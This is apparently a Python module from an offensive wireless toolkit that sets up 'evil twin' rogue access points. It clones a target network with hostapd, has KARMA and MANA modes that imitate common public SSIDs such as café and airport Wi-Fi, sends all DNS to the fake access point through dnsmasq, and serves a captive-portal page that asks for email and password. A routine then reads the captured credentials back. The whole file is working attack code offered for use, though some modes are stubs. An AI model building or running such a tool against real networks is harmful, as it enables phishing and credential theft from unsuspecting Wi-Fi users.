"""
Evil Twin Attack Module
=======================
Rogue AP creation: basic, KARMA, MANA, adaptive evil twin.
"""

import os
import time
import subprocess
from typing import Optional, Dict, Any, List
from dataclasses import dataclass

from bhisma.core.config import BhismaConfig
from bhisma.core.mimicry import MimicryEngine
from bhisma.core.fingerprint import FingerprintingEngine
from bhisma.tools.binder import ToolBinder

from rich.console import Console

console = Console()


@dataclass
class RogueAPResult:
    ssid: str = ""
    bssid: str = ""
    channel: int = 0
    portal_url: Optional[str] = None
    status: str = "stopped"
    credentials_captured: List[Dict] = None

    def __post_init__(self):
        if self.credentials_captured is None:
            self.credentials_captured = []


class EvilTwinManager:
    """Manages rogue access point attacks."""

    def __init__(self, iface: str, config: Optional[BhismaConfig] = None):
        self.iface = iface
        self.config = config or BhismaConfig.load()
        self.fingerprint = FingerprintingEngine()
        self.mimicry = MimicryEngine(self.fingerprint)
        self.binder = ToolBinder()
        self._active_ap: Optional[RogueAPResult] = None

    def start_rogue_ap(
        self,
        target_bssid: str,
        ssid: Optional[str] = None,
        channel: Optional[int] = None,
        encryption: Optional[str] = None,
        portal: bool = True,
        karma: bool = False,
        mana: bool = False,
        radius: bool = False,
    ) -> RogueAPResult:
        """
        Start a rogue access point.

        Args:
            target_bssid: BSSID to clone
            ssid: SSID (auto-detected if None)
            channel: Channel (auto-detected if None)
            encryption: Encryption type to mimic
            portal: Enable captive portal phishing
            karma: Respond to all probe requests
            mana: Broadcast multiple fake SSIDs
            radius: Fake enterprise RADIUS server
        """
        result = RogueAPResult(bssid=target_bssid)

        # Get mimicry parameters from target profile
        mimic_params = self.mimicry.apply_to_beacon_flood(target_bssid, ssid or "")

        console.print(f"[bold red][!] Starting Evil Twin for {ssid or target_bssid}[/bold red]")

        # Generate hostapd config
        config_path = self._generate_hostapd_config(
            ssid=ssid or "FakeAP",
            channel=channel or 6,
            iface=self.iface,
            karma=karma,
        )

        # Start hostapd
        try:
            self.binder.execute("hostapd", [config_path], realtime_callback=lambda line: console.print(f"[dim]{line}[/dim]"))
            result.status = "running"
            result.ssid = ssid or "FakeAP"
            result.channel = channel or 6
        except Exception as e:
            console.print(f"[red]    hostapd error: {e}[/red]")
            result.status = "failed"

        # Start dnsmasq for DHCP/DNS
        if result.status == "running":
            self._start_dnsmasq()

        # Enable captive portal
        if portal and result.status == "running":
            result.portal_url = self._start_captive_portal(ssid or "FakeAP")

        self._active_ap = result
        return result

    def start_karma(self, iface: str) -> RogueAPResult:
        """Start KARMA attack — respond to ALL probe requests."""
        console.print("[bold red][!] Starting KARMA attack[/bold red]")
        # Would use hostapd-karma patch or custom implementation
        return self.start_rogue_ap(
            target_bssid="00:00:00:00:00:00",
            ssid="KARMA",
            karma=True,
        )

    def start_mana(self, iface: str, ssid_list: Optional[List[str]] = None) -> RogueAPResult:
        """Start MANA attack — broadcast multiple common SSIDs."""
        console.print("[bold red][!] Starting MANA attack[/bold red]")
        common_ssids = ssid_list or [
            "Starbucks WiFi", "xfinitywifi", "AT&T WiFi", "T-Mobile_WiFi",
            "GoogleGuest", "Airport-Free-WiFi", "HotelGuest", "GuestNetwork",
        ]
        for ssid in common_ssids[:5]:
            console.print(f"[dim]    Broadcasting: {ssid}[/dim]")
        # Would use mdk4 or multiple hostapd instances
        return RogueAPResult(status="running", ssid="MANA_MULTI")

    def stop(self) -> None:
        """Stop the active rogue AP."""
        if self._active_ap:
            console.print("[yellow][*] Stopping rogue AP...[/yellow]")
            try:
                subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
                subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
            except Exception:
                pass
            self._active_ap.status = "stopped"

    def _generate_hostapd_config(
        self,
        ssid: str,
        channel: int,
        iface: str,
        karma: bool = False,
    ) -> str:
        """Generate a hostapd configuration file."""
        config_path = "/tmp/bhisma_hostapd.conf"
        config = f"""interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        if karma:
            config += "karma=1\n"
        with open(config_path, "w") as f:
            f.write(config)
        return config_path

    def _start_dnsmasq(self) -> None:
        """Start dnsmasq for DHCP and DNS on rogue AP."""
        config = "/tmp/bhisma_dnsmasq.conf"
        with open(config, "w") as f:
            f.write("""interface=ap0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
address=/#/10.0.0.1
""")
        try:
            subprocess.Popen(["dnsmasq", "-C", config], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def _start_captive_portal(self, ssid: str) -> str:
        """Start a captive portal web server."""
        portal_dir = "/tmp/bhisma_portal"
        os.makedirs(portal_dir, exist_ok=True)
        html = f"""<!DOCTYPE html>
<html><head><title>{ssid} - Login</title>
<style>body{{font-family:Arial;background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.container{{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:320px}}
h2{{color:#333;margin-bottom:20px}}input{{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}}
button{{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}}
button:hover{{background:#0056b3}}</style></head>
<body><div class="container">
<h2>{ssid}</h2>
<p>Please sign in to continue.</p>
<form action="/login" method="POST">
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>"""
        with open(os.path.join(portal_dir, "index.html"), "w") as f:
            f.write(html)
        # Start simple Python HTTP server
        try:
            import threading
            def run_server():
                import http.server
                import socketserver
                handler = http.server.SimpleHTTPRequestHandler
                with socketserver.TCPServer(("", 80), handler) as httpd:
                    httpd.serve_forever()
            threading.Thread(target=run_server, daemon=True).start()
        except Exception:
            pass
        return "http://10.0.0.1/"

    def get_captured_credentials(self) -> List[Dict]:
        """Get any credentials captured by the portal."""
        creds_file = "/tmp/bhisma_portal/creds.txt"
        if os.path.exists(creds_file):
            with open(creds_file, "r") as f:
                return [{"raw": line.strip()} for line in f if line.strip()]
        return []
